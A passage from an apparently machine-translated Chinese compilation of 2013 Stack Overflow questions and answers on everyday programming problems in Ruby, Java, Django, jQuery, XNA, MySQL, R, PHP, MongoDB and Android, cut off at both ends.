def topic_button(community)
    if !community.topics.order("last_active_at DESC").last.nil? && community.topics.order("last_active_at DESC").last.last_active_at.to_date == Date.current.to_date
        'posted today'
    else
        'no post today'
    end
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:19:10.253

```
 if  @community.topics.last_active_at == Date.current.to_date
        puts "posted today"
 else
        puts "no post today"
 end 
```

希望能帮助到你

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T00:21:37.360

你真的应该只做一次查询：

```
topic = community.topics.order("last_active_at DESC").last

if topic && topic.last_active_at.to_date == Date.current.to_date
   puts "posted today"
else
  puts "no post today"
end 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T00:21:49.410

您可以使用以下`today?`方法：

```
def topic_button(community)
  last_post = community.topics.order('last_active_at DESC').last
  if last_post && last_post.last_active_at.today?
    'posted today'
  else
    'no post today'
  end
end 
```

# java - getText() 方法在有文本时返回 null

> ID：16204332
> 
> 赞同：0
> 
> 时间：2013-04-25T00:13:06.670
> 
> 标签：java, swing, jtextfield, numberformatexception

每当我在文本框中输入数字并获取文本并将其转换时，我都会遇到异常：

```
Exception in thread "AWT-EventQueue-0" java.lang.NumberFormatException: For input string: "" 
```

这是该类的代码：

### 数字生成器：

```
package Main;

public class Number_Generator {

    public int makeRandom(){
        int Rnumber = 1;
        Rnumber = 1 + (int)(Math.random()*20);
        return Rnumber;
    }

} 
```

## 操作添加：

```
package Main.Oper_classes;
import Main.Number_Generator;
import javax.swing.*;
import java.awt.*;
import Main.Oper_check.*;

public class Oper_add {

    Number_Generator gen = new Number_Generator();
    public JTextField textbox = new JTextField(2);
    //make random numbers
            public Integer Rnumber1 = gen.makeRandom();
            public Integer Rnumber2 = gen.makeRandom();

    public void main(){
        //set textbox to null
        this.textbox.setText(null);

        //import classes
        Add_Check check = new Add_Check();
        //convert to String
        String Rnumber1S = Rnumber1.toString();
        String Rnumber2S = Rnumber2.toString();

        //make GUI
        JFrame frame = new JFrame("Addition Test");
        JPanel panel = new JPanel();
        FlowLayout fl = new FlowLayout();
        panel.setLayout(fl);

        JLabel num1 = new JLabel(Rnumber1S);
        JLabel sign = new JLabel("+");
        JLabel num2 = new JLabel(Rnumber2S);
        JLabel equals = new JLabel("=");
        JButton confirm = new JButton("Check");

        //add action listener
        confirm.addActionListener(check);

        //add componets to window
        panel.add(num1);
        panel.add(sign);
        panel.add(num2);
        panel.add(equals);
        panel.add(textbox);
        panel.add(confirm);

        //set frame settings
        frame.setContentPane(panel);
        frame.setVisible(true);
        frame.pack();

    }

} 
```

## 添加检查：

```
package Main.Oper_check;
import java.awt.event.*;
import javax.swing.JOptionPane;
import Main.Oper_classes.*;

public class Add_Check implements ActionListener {

    @Override
    public void actionPerformed(ActionEvent e) {
        Oper_add add = new Oper_add();

        String textbox = add.textbox.getText().trim();
        Integer textboxC = Integer.parseInt(textbox);
        Integer total = add.Rnumber1 + add.Rnumber2;

    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T00:38:40.133

```
Oper_add add = new Oper_add();
String textbox = add.textbox.getText().trim();
Integer textNumber = Integer.parseInt(textbox); 
```

您正在创建一个新`Oper_add`的，其中有一个新的空文本框。您期望该文本框有一个值，但它不会。它与您正在与之交互的任何文本框都没有任何关系。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T00:23:46.013

文本框当前有一个空字符串（或者可能只是空格 -`trim`删除空格）。它没有空值。例外是因为空字符串不是有效数字。您应该捕获异常，然后在 JOptionPane 中使用它：

```
try {
    Integer textNumber = Integer.parseInt(textbox);
     ...
} catch (NumberFormatException ex) {
    JOptionPane.showMessageDialog(this, ex.getMessage(), "Number Error", JOptionPane.ERROR_MESSAGE);
} 
```

# django - 从服务器名称检测当前的 Django 站点

> ID：16204335
> 
> 赞同：0
> 
> 时间：2013-04-25T00:13:29.530
> 
> 标签：django

我希望使用 Django Sites 框架根据当前 URL 提供不同的内容。例如，如果 URL 是[http://siteA.example.com/](http://siteA.example.com/)，调用 Django 的`Site.objects.get_current()`方法将返回一个`url`值为的 Site 对象`siteA.example.com`。

这可能吗？如果可以，怎么做？

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T00:26:40.017

你可以试试

```
django.contrib.sites.models 
```

并使用`get_current_site(request).id`

如**[文档](https://docs.djangoproject.com/en/dev/ref/contrib/sites/#associating-content-with-multiple-sites)**中所述。

或者你可以使用[**django-subdomains**](https://github.com/tkaemming/django-subdomains)。

有了这个，您可以使用**subdomains.utils.reverse()**来识别当前正在使用的子域。

文档**[在这里](http://django-subdomains.readthedocs.org/en/latest/ref/utils.html#subdomains.utils.reverse)**。

# javascript - 在html中增加javascript变量

> ID：16204339
> 
> 赞同：0
> 
> 时间：2013-04-25T00:13:57.937
> 
> 标签：javascript, jquery, html

这应该是一个非常简单的问题。我只是想在此处将变量“inputNumber”输入到附加的 html 片段中。每次添加此 html 时，inputNumber 都应递增。

所以基本上我希望每次单击“addMore”时输入名称、id 和 div id 从 5 递增。

```
var inputNumber = 5;

$("#addMore").click(function() {
$("#input-names").append("<input type='text' id='name' + inputNumber++ name='name' + inputNumber++> <div class='delete-line' id='delete-' + inputNumber++><a href='JavaScript:void(0);'>X</a></div><br>");
}); 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T00:16:43.700

您只是在插入变量之前没有终止字符串。

```
var inputNumber = 5;

$("#addMore").click(function() {
  inputNumber++;
  $("#input-names").append("<input type='text' id='name"+ inputNumber +"' name='name"+ inputNumber +"' > <div class='delete-line' id='delete-"+ inputNumber +"'><a href='JavaScript:void(0);'>X</a></div><br>");
}); 
```

您可以通过突出显示代码差异的语法看到。你的IDE也应该有这个功能。

您曾多次尝试使用增量运算符 (++)。这也是一个问题，因为每次调用`inputNumber++`该值都会增加。这意味着在您的代码中（固定引号），您仍然将值增加 3，因为您调用了`inputNumber++`3 次。`inputNumber++`我通过在单击回调开始时仅调用一次来更改此行为。

* * *

您可能还想考虑通过使用此语法创建具有属性的元素来提高代码的可读性 -

```
var inputElem = $('<input />', {
    type: 'text',
    id: 'name'+inputNumber,
    name: 'name'+inputNumber
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T00:18:27.717

在追加之外调用`inputNumber++`一次，否则每次在要追加的长字符串中说明时都会增加。增量运算符是自赋值的，这意味着它们递增 1 并分配给一次全部递增的值。代码等价于`inputNumber = inputNumber + 1`

```
$("#addMore").click(function() {
    inputNumber++;
    $("#input-names").append("<input type='text' id='name" + inputNumber + "' name='name" + inputNumber + "'> <div class='delete-line' id='delete-" + inputNumber + "'><a href='JavaScript:void(0);'>X</a></div><br>");
}); 
```

使用另一种方式，第一次点击的结果 HTML 将是：

```
<input type='text' id='name6' name='name7' />
<div class='delete-line' id='delete8'>
    <a href='javascript:void(0);'>X</a>
</div> 
```

此外，请确保您的文本字符串正确连接。

# java - 比较 bytes[] 和 String.getBytes()

> ID：16204340
> 
> 赞同：0
> 
> 时间：2013-04-25T00:14:09.283
> 
> 标签：java, encoding, character-encoding

我正在调试 OAuth（`shindig`和`spring-security-oauth`库）的自定义实现。

不管 shindig 和 spring-security 细节如何，我使用创建一个哈希`sha()`，然后将其传递给 spring-security-oauth。我希望哈希值相等，但事实并非如此。

**辛迪格**

`bytes[] shindigHash = sha(someBytes);`// [sha() 的文档](http://commons.apache.org/proper/commons-codec/apidocs/org/apache/commons/codec/digest/DigestUtils.html#sha%28byte%5B%5D%29)

**spring-security-oauth**

```
bytes[] b = str.getBytes("UTF-8");` // String str passed in from 
```

我也尝试了默认编码，但是当我比较每个's 和' 元素时`bytes[] b = str.getBytes();`它并不相等。`shindigHash``b``shindigHash`

**编辑**

```
for j = 0 .. b.length // same as shindigHash length
   print shindigHash[j] ... b[j]
end
visually compare results 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T00:35:14.107

`getBytes()`不返回哈希。它返回字符串的字节表示。所以他们永远不会对应。

SHA-1（或其他哈希）的一种可能表示形式是一串十六进制数字。

“af45 死牛肉”

那是一个字符串。调用`getBytes()`它不会返回哈希值。为什么？

好吧，考虑一个简单的哈希：

000000000000000

那是一堆零字节。`byte[]`会的`{ 0, 0, 0, ... }`。

然而，

```
"00000000000000".getBytes("utf-8") 
```

将返回

```
 { 30, 30, 30, 30, 30, 30 .... } /* those are hex 30's */ 
```

'0' 的 UTF-8 表示是 0x30，而不是 0x00。

因此，如果字符串包含哈希的十六进制表示，那么您将需要将 转换为`byte[]`包含它的十六进制表示的字符串，或者`byte[]`通过将每对字符转换为 a 来将字符串转换为 a `byte`。

# c# - XNA 4 - 如何不在同一行生成小行星？

> ID：16204341
> 
> 赞同：0
> 
> 时间：2013-04-25T00:14:12.330
> 
> 标签：c#, xna, xna-4.0

我有小行星在我的游戏中产生，它们产生时有一个计时器，我希望它们一次产生一个。我的问题是它们都在同一行产卵，所以当它们提高速度时，它们会在已经几乎离开屏幕的小行星上产卵。这就是它的样子。

[http://www.youtube.com/watch?v=9pKXZyzIpGs&feature=youtu.be](http://www.youtube.com/watch?v=9pKXZyzIpGs&feature=youtu.be)

这是我的更新代码。

```
namespace PixeBlastGame
{
    public class GameUpdate
    {
        SpriteBatch spriteBatch;
        GameTime gameTime;

        Vector2 vPlayer = new Vector2(0, 720 / 2);
        Vector2 vAsteroid;
        Vector2 velocity;
        Random rand = new Random();

        float spawnTimer;
        float spawnRate = 1;
        List<Vector2> Asteroids = new List<Vector2>();

        public GameUpdate()
        {
            vAsteroid.Y = rand.Next(100, 680);
            vAsteroid.X = 1100;
        }

        public void Update(GameTime theTime)
        {
            gameTime = theTime;
            vPlayer.Y += velocity.Y;

            float elapsed = (float)gameTime.ElapsedGameTime.TotalSeconds;
            spawnTimer += elapsed;

            if (spawnTimer >= spawnRate)
            {
                Asteroids.Add(new Vector2(1000 ,rand.Next(0, 720)));
                spawnTimer = 0;
            }

            if (Keyboard.GetState().IsKeyDown(Keys.Down))
            {
                velocity.Y = 5;
            }

            else if (Keyboard.GetState().IsKeyDown(Keys.Up))
            {
                velocity.Y = -5;
            }

            else
            {
                velocity.Y = 0;
            }

            if (vPlayer.Y > 630 )//+ Game1.tPlayer.Height)
                vPlayer.Y = 630;
            if (vPlayer.Y < -10) //+ Game1.tPlayer.Height)
                vPlayer.Y = -10;

        }

        public void Draw(SpriteBatch theBatch)
        {
            spriteBatch = theBatch;

            foreach (Vector2 asteroid in Asteroids) //Draw each astroid
            {
                DrawAsteroid(asteroid.X, asteroid.Y);
            }

            spriteBatch.Begin();

            spriteBatch.Draw(Game1.tPlayer, vPlayer, Color.White);

            spriteBatch.End();
        }

        public void DrawAsteroid(float x, float y)
        {
            vAsteroid.X -= 5; vAsteroid.Y = y;
            spriteBatch.Begin();
            spriteBatch.Draw(Game1.tAsteroid, vAsteroid, Color.White);
            spriteBatch.End();
        }
    }
} 
```

如果您需要提供更多代码来帮助我，请发表评论。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:18:52.270

做一个小行星类

```
public class Asteroid
{
       public Vector2 Velocity;
       public Vector2 Position;
       public Asteroid(Vector2 velocity, vector2 position)
       {
        Velocity = velocity;
        Position = position;
       }
} 
```

现在将您的列表更改为：

```
List<Asteroid> Asteroids = ... 
```

从现在开始你可以做这样的事情

```
Asteroids[0].Velocity = Whatever 
```

通过这种方式，您可以修改小行星的每个**实例**

现在看看你的draw方法，

```
public void DrawAsteroid(float x, float y)
        {
            vAsteroid.X -= 5; vAsteroid.Y = y;
            spriteBatch.Begin();
            spriteBatch.Draw(Game1.tAsteroid, vAsteroid, Color.White);
            spriteBatch.End();
        } 
```

你甚至没有使用 x 和 y 值，那有什么意义呢？现在，在您的代码中的任何地方，您都必须删除 vASteroid 并使用列表中的实例！

改成`DrawAsteroid`这样：

```
 public void DrawAsteroid(Asteroid a)
            {
                spriteBatch.Begin();
                spriteBatch.Draw(Game1.tAsteroid, a.Position, Color.White);
                spriteBatch.End();
            } 
```

以及对它的呼唤..

```
 foreach (Asteroid a in Asteroids) //Draw each astroid
    {
        DrawAsteroid(a);
    } 
```

现在我们需要在更新中做同样的事情，不要更新你的位置`Draw()`

在更新中添加：

```
 foreach (Asteroid a in Asteroids) //Update each astroid
    {
        UpdateAsteroid(a, elapsed);
    } 
```

并添加新方法...

```
 public void UpdateAsteroid(Asteroid a, float elapsed)
        {
            a.Position += a.Velocity * elapsed;
        } 
```

现在，当您生成小行星时，您需要确保添加了速度！

```
Asteroids.Add(new Asteroid(new Vector2(0,-10), new Vector2(50,50))); 
```

这将产生一个 Y*速度*为 -10 且*位置*为 50,50的小行星

# android - 如何为矩形建筑物设置接近警报（android）？

> ID：16204348
> 
> 赞同：0
> 
> 时间：2013-04-25T00:15:12.590
> 
> 标签：android, proximity, geofencing

我知道可以在中心纬度和经度的半径范围内设置接近警报。但我想知道如何为非圆形的特定建筑物设置接近警报。

就我而言，我想在用户进入建筑物但不在建筑物附近时提醒他。

如果您遇到一些关于此的有用信息，请发布链接。

任何解决我的问题的建议都非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-10T14:24:12.710

将半径设置为比建筑物大小多一点或少一点。但是，考虑到gps精度在20m左右，甚至更多

# mysql - 我的 sql 每次都返回第一行，

> ID：16204351
> 
> 赞同：0
> 
> 时间：2013-04-25T00:15:53.383
> 
> 标签：mysql, sql, rows

```
SELECT p.Producttype, pp.ProductID, r.Date1, r.Date2
FROM customers AS c
INNER JOIN orders AS r ON c.Cusid = r.Cusid
INNER JOIN temporary AS temp ON r.Cusid = temp.Cusid
INNER JOIN products AS pp ON pp.ProductID = temp.ProductID
INNER JOIN Producttypes AS p ON p.Producttypeid = pp.Producttypeid
WHERE temp.Cusid =  '23'
GROUP BY pp.ProductID 
```

请帮助我不知道还能做什么，查询每次将第一行返回到列 date1 和 date2

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T02:54:20.287

这是 MySql 的一个已知问题。它将允许在没有任何非分组字段的聚合函数的情况下进行分组。

它以其默认行为返回 group-by 之外的所有字段的第一个聚合。看到这个：[为什么 MySQL 允许没有聚合函数的“group by”查询？](https://stackoverflow.com/questions/1225144/why-does-mysql-allow-group-by-queries-without-aggregate-functions)[没有聚合功能的 GROUP BY 子句有什么原因吗](https://stackoverflow.com/questions/2197693/any-reason-for-group-by-clause-without-aggregation-function)？

删除该`Group By`条款，你应该没问题。

```
SELECT p.Producttype, pp.ProductID, r.Date1, r.Date2
FROM customers AS c
INNER JOIN orders AS r ON c.Cusid = r.Cusid
INNER JOIN temporary AS temp ON r.Cusid = temp.Cusid
INNER JOIN products AS pp ON pp.ProductID = temp.ProductID
INNER JOIN Producttypes AS p ON p.Producttypeid = pp.Producttypeid
WHERE temp.Cusid =  '23'
 --GROUP BY pp.ProductID -->This should be removed as it causes to returne the first of each other field while keeping ProductID distinct in the returned table. 
```

# r - 从 R 中的两个数据帧中随机选择相同的 X 行

> ID：16204353
> 
> 赞同：2
> 
> 时间：2013-04-25T00:15:56.393
> 
> 标签：r, random-sample

我在 R 中进行分类。我有一个称为 testD 的测试数据数据框和一个称为结果的数据数据框（这些是正确的分类值）。

这些数据帧非常大，在整个集合上训练我的模型需要很长时间，所以我想随机选择大约 5,000 个数据点并在此基础上进行训练。

我知道如何从任一数据框中随机选择 5,000 行，但我需要确切知道我从“testD”中选择了哪些行，以便知道“结果”中的哪些 5,000 行要进行比较。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-25T00:25:19.893

你可以这样做：

```
indices = sample(NROW(testD), 5000)
testD.sample = testD[indices, ]
results.sample = results[indices, ] 
```

# php - 如何知道什么时候在php的析构函数中抛出异常

> ID：16204354
> 
> 赞同：1
> 
> 时间：2013-04-25T00:16:01.603
> 
> 标签：php, class, exception, try-catch, destructor

假设我有一些类可以使用 MVC。控制器的基类有构造函数和析构函数。

```
class BaseController {
    public function __construct() {
        ob_start();

    }

    # Some code here.

    public function __destruct() {
        if(!error_get_last()) {
            if(!$this->doNotOutputBuffer) {
                $controllerContent = ob_get_contents();
                ob_clean();
                $this->_template->render($this->_appinfo['directory'], $this->templateOptions, $controllerContent);
            } else {
                $this->_template->render($this->_appinfo['directory'], $this->templateOptions);
            }
        }
    }
} 
```

注意 ob_star() 和 ob_clean() 在每个函数上的存在，它应该将视图数据传递给模板类以使用模板渲染视图。当抛出异常时，我在 LoginController 之外的“TryCatch”块中捕获错误，但始终调用析构函数并且 error_get_last() 函数返回 NULL，无论如何，即使出现错误，视图也会被加载。

```
class LoginController extends BaseController{

    public function __construct() {
        parent::__construct();
    }

    public function main() {    
        throw new Exception("Error Fatal...");
    }

    public function __destruct() {
        parent::__destruct();
    }

} 
```

我如何知道何时发生不显示视图的异常？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T00:26:01.527

添加标志和包装方法。

```
class LoginController extends BaseController{

    private $_is_throwed = false;

    public function __construct() {
        parent::__construct();
    }

    public function main() {
        try{
            $this->_main();
        } catch (Exception $e) {
            $this->_is_throwed = true;
            throw $e;
        }
    }

    private function _main() {
        throw new Exception("Error Fatal...");
    }

    public function __destruct() {
        if (!$this->_is_throwed) {
            parent::__destruct();
        } else {
            ob_clean();
        }
    }

} 
```

PS 但是要小心在 destructs 中使用逻辑，它会引起麻烦。

# mongodb - 更新 Mongo 中包含相同对象的多个文档？

> ID：16204356
> 
> 赞同：0
> 
> 时间：2013-04-25T00:16:13.527
> 
> 标签：mongodb, meteor

所以，我有多个 mongo 文档是“组”。在每个组中，我都有一个“成员”数组的子对象。我正在尝试进行查询以从每个“组”中删除“成员”的所有实例？

这是我的 Mongo 文档结构

```
Group: {
  _id: whatever, 
  members: [
    {firstName: "stupid", lastName: "head"},
    {firstName: "stupid2", lastName: "head2"},
    {firstName: "stupid3", lastName: "head3"}
  ]
} 
```

假设我有多个这些“组”。我想说“如果一个组包含'stupid2 head2'，请从中删除'stupid2 head2'。”

我正在尝试查询包含某个成员的所有组...

```
Groups.find({"members": {"firstName": "stupid2", "lastName": "head2"} }); 
```

但这将返回所有组，而不仅仅是符合条件的组。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T04:14:59.780

以下是“删除”具有特定名字/姓氏的成员数组元素所要做的：

```
db.Groups.update( 
     { members : { $elemMatch : {
          firstName : "stupid", 
          lastName: "head"
     } } }, 
     { $pull : { members : {
          firstName : "stupid", 
          lastName: "head"
     } } }
); 
```

[$pull](http://docs.mongodb.org/manual/reference/operator/pull/)是从文档中的数组中删除元素的运算符。 [$elemMatch](http://docs.mongodb.org/manual/reference/operator/elemMatch/)是一种匹配具有您指定的所有属性的数组元素的方法。

# java - 根据在 ListView 中单击的项目位置执行活动的线程

> ID：16204360
> 
> 赞同：1
> 
> 时间：2013-04-25T00:16:19.540
> 
> 标签：java, android, multithreading, listview, android-activity

好的，这是我遇到的问题。我正在开发一个简单的消息客户端，类似于 Android 设备上的 OEM 客户端。

我目前有一个`ConversationList.java`包含与实际用户进行对话的人的用户名的 ListView。

我想启动 a 的特定线程`ConversationThread.java`（这是一个包含另一个 ListView 保存用户之间交换的消息的活动）。

我最初考虑`ConversationThread`在每次添加对话时实例化一个新的`ConversationList.java`，然后将其添加到数组列表中。然后基于引用 ConversationThread 的 ArrayList 位置的 ListView 上的 onItemClick 上的位置参数执行 ConversationThread 的特定“线程”。

```
public class ConversationList extends Activity 
{
ArrayList<ConversationThread> ListOfActiveThreads = new ArrayList<ConversationThread>();
ListView convoList;
ArrayAdapter<String> adapter;
ArrayList<String> ActiveConversations = new ArrayList<String>();

@Override
protected void onCreate(Bundle savedInstanceState) 
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_conversation_list);
    convoList = (ListView) findViewById( R.id.Conversations );
    Button addConvo = (Button) findViewById(R.id.Talk);
    adapter = new ArrayAdapter<String>(this, android.R.layout.simple_list_item_1, ActiveConversations);
    convoList.setAdapter(adapter);

    addConvo.setOnClickListener(new OnClickListener()  
    {
        public void onClick(View v) //will add the person to be sending to to the list of active conversations
        {
            EditText person2add = (EditText) findViewById(R.id.Friend2Sendto);
            String person = person2add.getText().toString();
ConversationThread newMessage = new ComversationThread(person);
ListOfActiveThreads.add(newMessage);
            adapter.add(person);
            adapter.notifyDataSetChanged();
            person2add.setText("");         

        }
    });

    convoList.setOnItemClickListener(new ListView.OnItemClickListener() {
        @Override
        public void onItemClick(AdapterView<?> a, View v, int i, long l) 
        {

        Intent mainIntent = new Intent(ConversationList.this, ConversationThread.class); //this starts a new instance of the ConversationThread class each time
        startActivity(mainIntent);
/* Here I want to start or resume the ConversationThread.getposition(i) */
        }
    });

} 
```

我的问题是，因为`ConversationList.java`我有一个基本的 android 活动模板，有一个`oncreate()`类等。我是否让这个类实现 Runnable 并以某种方式让它像 Java 中的一个线程？或者有没有更好的方法来创建列表视图使用的正在运行的活动列表。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-26T02:04:08.077

简短的回答是，你没有。将[ListFragments](http://developer.android.com/reference/android/app/ListFragment.html)用于您的列表并在 onItemClick 中在它们之间切换。这使您能够实现接口以在您的活动和片段（或片段到片段）之间“对话”。要从 UI 线程中获取网络操作或任何密集处理，请使用[Loader](http://developer.android.com/guide/components/loaders.html)。加载程序完成后，调用您在 Activity 和 Fragments 上实现的接口回调，以将结果传递到需要它们的地方。

查看活动和片段教程，以更好地了解如何/何时/最佳实践。对于新开发人员来说，理解一些细微的差异可能会让人感到困惑。

[这是Fragments](http://developer.android.com/guide/components/fragments.html)的教程。这将为您提供我上面提到的实现示例：

# sql - 需要了解 JOINS 的用例 - 当您只对连接的一部分感兴趣时，为什么要加入？

> ID：16204368
> 
> 赞同：0
> 
> 时间：2013-04-25T00:17:04.380
> 
> 标签：sql

好的，这不是一个编程问题，所以请随意投反对票（耶！我第一次鼓励这种行为 - 充分利用它）。

但是，我觉得知道这一点很重要。我已经搜索了谷歌，但没有看到一个页面给出了为什么需要特定连接的真实示例。

我读了这个很好的教程 - [http://www.codinghorror.com/blog/2007/10/a-visual-explanation-of-sql-joins.html](http://www.codinghorror.com/blog/2007/10/a-visual-explanation-of-sql-joins.html) 我的主要问题是，如果你加入两个表并只提取部分它（例如 - 链接中的 3、4 th pic），那你为什么要加入呢？

我需要一个真实的例子，它告诉我需要加入两个表，然后只提取其中的一部分。

万岁！让投票开始吧！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:19:56.490

您可以将两个表连接在一起，即使您只需要其中一个表中的列，以便您可以过滤第二个表中的列。

示例：教师表和学生表。如果他们班上至少有 20 个孩子，您只需要教师姓名列表。您将这两个表连接起来以找出一个教师有多少学生，但您只从教师表中选择名称 - 非常简单的示例。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T00:21:22.393

通常，JOIN 仅用于确定您感兴趣的表中的行。例如，“告诉我所有住在温室中的人的姓名”。如果您有一张人和一张房子的桌子，您将加入他们以确定谁住在每栋房子里，并使用 WHERE 子句选择温室。但是您只会从 People 表中返回名称。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-25T00:27:02.243

连接（理想情况下）仅通过 1 个字段（外键）完成，目的是获取关联表中的数据行。然后您使用的字段会有所不同，有时是全部，有时是 1，但这都是在连接发生之后。

否则，每个字段或字段集都需要自己的键......这会将其放在自己的表中。

给定行的数据集是与该实体关联的数据，因此即使有时只需要 1 个字段，“用户”也将拥有 1 条记录的电子邮件、姓名、地址等。

# php - GCM实施疑点

> ID：16204369
> 
> 赞同：0
> 
> 时间：2013-04-25T00:17:05.780
> 
> 标签：php, android, google-cloud-messaging

我是 GCM 新手，对 Android 编程也比较陌生。我正在尝试实现推送通知。我的 MySQL 数据库中有 gcm_reg_no。

现在我想将推送通知发送到这些注册 ID。你能帮我知道下一步是什么吗？我需要在项目的 Android 部分添加任何内容吗？还是我只需要使用 PHP 将请求发送到 GCM 服务器？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-04T18:57:47.493

如果您将设备中的 GCM 注册 ID 发回您的服务器并存储在您的数据库中，那么您所要做的就是在您想要向 GCM 服务器发送推送通知时将数据传递给 GCM 服务器。

例如，这是我用来发送推送通知的函数：

```
//reg array here is an array of the GCM_reg_Ids I wish to send the push to
function push($regarr)
{

// Set POST variables
$url = 'https://android.googleapis.com/gcm/send';

// Google API KEY, If you don't know your key just walk through the starter guide
$apiKey = "***************";

// Get all the message variables
// These are variables of data you send in the push notification which you use in the 
// Appcode to do stuff
$message = "test" ;
$data = "http://www.google.com";
$preheader = "New Notification";
$header = "test" ;

$fields = array(
              'registration_ids'  => $regarr,
              'data'              => array( "message" => $message,
                                            "preheader" => $preheader,
                                            "header" => $header,
                                            "data" => $data ),
              );

  $headers = array( 
                  'Authorization: key=' . $apiKey,
                  'Content-Type: application/json'
              );

  // Open connection
  $ch = curl_init();

  // Set the url, number of POST vars, POST data
  curl_setopt( $ch, CURLOPT_URL, $url );

  curl_setopt( $ch, CURLOPT_POST, true );
  curl_setopt( $ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );

  curl_setopt( $ch, CURLOPT_POSTFIELDS, json_encode( $fields ) );

  // Execute post
  $result = curl_exec($ch);

  // Close connection
  curl_close($ch);

  $json_return = json_decode($result);
  return $json_return;
} 
```

不要忘记确保您在 PHP 上启用了 CURL，那里有很多指南，其中包含示例和 GCM 入门，快乐推送消息：D

# mysql - 带有 update_attribute 的 Rails rake 任务导致 Mysql2::Error：“字段列表”中的未知列“NaN”

> ID：16204370
> 
> 赞同：1
> 
> 时间：2013-04-25T00:17:09.767
> 
> 标签：mysql, ruby-on-rails, ruby

我在尝试更新数据库中的字段时遇到了一个我似乎无法弄清楚的错误。我正在通过 rake 任务使用带有 update_attribute 的 rails。奇怪的是，该错误与任务或任何方法中未使用的列有关。

我试过使用`update_attributes`as well，`position.save(validate: false)`但它们都导致相同的错误。任何帮助是极大的赞赏。

错误：

```
Mysql2::Error: Unknown column 'NaN' in 'field list': UPDATE `positions` SET `is_open` = 0, `cost_per_share` = NaN WHERE `positions`.`id` = 617 
```

错误跟踪到的行：

```
position.update_attribute(:is_open, open) 
```

任务源代码：

```
namespace :tom do
  desc "Update positions.is_open field"
  task check_if_open: :environment do

    include TomDate

    positions = Position.all
    positions.each do |position|

      if position.orange_highlight == 1
        open = 0
      elsif position.buy_misc == 'EXP' || position.buy_misc == 'ASSIGN' || position.sell_misc == 'EXP' || position.sell_misc == 'ASSIGN'
        if position.profit == 0 && position.loss == 0
          open = 1
        elsif position.profit > 0
          open = 0
        elsif position.loss < 0
          open = 0
        else
          open = 1
        end
      elsif tom_is_date_valid(position.buy_date) || tom_is_date_valid(position.sell_date)
        if position.profit == 0 && position.loss == 0
          open = 1
        elsif position.profit > 0
          open = 0
        elsif position.loss < 0
          open = 0
        else
          open = 1
        end
      else
        open = 1
      end

      position.update_attribute(:is_open, open)

    end

  end
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T02:21:19.600

将`update_attribute`行更改为：

```
sql = "UPDATE positions SET is_open = #{open} WHERE id = #{position.id}"
ActiveRecord::Base.connection.execute(sql) 
```

我不确定为什么 update_attribute 会失败。

# android - new AdapterView.OnItemSelectedListener(){} 类型必须实现继承的抽象方法错误。蚀

> ID：16204372
> 
> 赞同：4
> 
> 时间：2013-04-25T00:17:16.857
> 
> 标签：android, eclipse

我是 android 编程的初学者，但还遇到了另一个问题。我正在制作一个简单的微调器应用程序。这是代码。

```
package net.learn2develop.Basicviews6;

import android.os.Bundle;
import android.app.Activity;
import android.view.Menu;
import android.view.View;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemSelectedListener;
import android.widget.ArrayAdapter;
import android.widget.Spinner;
import android.widget.Toast;

public class BasicViews6Activity extends Activity {
String[] presidents;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    presidents =
            getResources().getStringArray(R.array.presidents_array);
    Spinner s1 = (Spinner) findViewById(R.id.spinner1);

    ArrayAdapter<String> adapter = new ArrayAdapter<String>(this,
            android.R.layout.simple_spinner_item, presidents);

    s1.setAdapter(adapter);
    s1.setOnItemSelectedListener(new OnItemSelectedListener()
    {
        @Override
        public void onItemSelected(AdapterView<?> arg0,
                View arg1, int arg2, long arg3)
        {
            int index = arg0.getSelectedItemPosition();
            Toast.makeText(getBaseContext(),
                    "You have selected item : " + presidents[index],
                    Toast.LENGTH_SHORT).show();
        }

        @Override
        public Void onNothingdSelected(AdapterView<?> arg0) { }

    });
}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.basic_views6, menu);
    return true;
}

} 
```

但它不会让我运行它，因为这些代码行：

```
 s1.setOnItemSelectedListener(new OnItemSelectedListener()
public Void onNothingdSelected(AdapterView<?> arg0) 
```

有如下错误：

new AdapterView.OnItemSelectedListener(){} 类型必须实现继承的抽象方法 AdapterView.OnItemSelectedListener.onNothingSelected(AdapterView)

有人可以启发我吗？任何帮助都感激不尽！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-25T00:22:59.150

void 需要写成小写的 v。

```
public void onNothingdSelected(AdapterView<?> arg0) { } 
```

代替

```
public Void onNothingdSelected(AdapterView<?> arg0) { } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T00:23:57.750

你的方法说`onNothingdSelected()`但它应该是`onNothingSelected()`。改变它；你拼错了。

* * *

## 回答 #3

> 赞同：1
> 
